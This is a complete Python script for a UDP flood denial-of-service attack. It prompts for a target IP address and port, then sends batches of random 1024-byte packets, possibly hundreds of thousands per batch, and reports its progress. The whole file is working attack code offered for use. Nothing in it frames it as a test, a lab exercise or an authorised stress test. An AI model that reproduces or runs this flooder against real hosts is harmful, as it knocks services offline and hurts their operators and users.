import socket
import random
import time

# Get user input in terminal
target_ip = input("Enter target IP address: ")
target_port = int(input("Enter target port: "))
batch_count = int(input("Enter number of batches: "))
packets_per_batch = int(input("Enter packets per batch: "))

# Create UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet_data = random._urandom(1024)

# Start sending
for batch in range(1, batch_count + 1):
    print(f"\nStarting batch {batch} of {batch_count}")
    for sent in range(1, packets_per_batch + 1):
        sock.sendto(packet_data, (target_ip, target_port))
        if sent % 100000 == 0 or sent == packets_per_batch:
            print(f"Sent {sent} packets so far in this batch...")
    print(f"✅ Batch {batch} complete: Sent {packets_per_batch} packets to {target_ip}:{target_port}")
